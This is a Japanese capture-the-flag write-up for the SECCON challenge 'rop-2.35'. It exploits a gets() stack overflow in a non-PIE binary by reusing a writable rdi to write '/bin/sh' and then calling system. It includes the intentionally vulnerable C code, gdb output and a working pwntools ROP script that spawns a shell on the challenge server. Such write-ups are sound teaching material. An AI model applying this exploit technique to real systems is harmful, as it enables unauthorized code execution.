# rop-2.35

## 概要

buffer overflow の脆弱性があります。

```c
void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

```bash
❯ checksec chall
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 観察

### No PIE

No PIE なので簡単に system を呼び出すことができます。
`system("/bin/sh")`を呼び出すことを目標とします。

### `/bin/sh` の書き込み

buf に書き込む場合、以下の問題点があります。

* 書き込んだアドレスが不明
  * `/bin/sh` を書き込み、**そのアドレスを**systemの引数に渡す必要がある
* `pop rdi; ret` のガジェットがない
  * 仮にアドレスが分かっても、systemの第一引数(rdi)を設定できない
  * `ROPgadget --binary chall | grep "pop rdi"`

### rdiの使い回し

rdiのガジェットがないので、systemを呼び出すときにたまたまセットされているrdiを使い回すことを考えます。

```text
gdb-peda$ disass main
...
   0x0000000000401184 <+46>:    ret  
...

gdb-peda$ b *main+46

gdb-peda$ run

gdb-peda$ info reg
...
rdi            0x7f93536e9a80      0x7f93536e9a80
...

gdb-peda$ info proc map
...
      0x7f93536e9000     0x7f93536f6000     0xd000        0x0  rw-p   
...
```

書き込み可能な領域でした。
systemを呼ぶ前にgetsを呼び、rdiの指すアドレスに `/bin/sh` を書き込んでおけば良さそうです。

## 解法

細かい注意点

* スタックのアライメント調整のために ret ガジェットを呼ぶ
  * <https://uchan.hateblo.jp/entry/2018/02/16/232029>
* `/bin/sh` ではなく `/bin0sh`
  * なぜか4バイト目がASCIIで1つ小さい値になってしまう（？）

```python
from pwn import *

exe = ELF("./chall")
context.binary = exe
io = remote('rop-2-35.seccon.games', '9999')

gets = 0x401060
ret = 0x40101a
call_system = 0x40116c

offset = 24
payload = b''
payload += b'A' * offset
payload += pack(ret)
payload += pack(gets)
payload += pack(call_system)

io.recvuntil(b'Enter something:')
io.sendline(payload)
# なぜか1つずれるので /bin/sh → /bin0sh
io.sendline(b'/bin0sh')
io.interactive()
```
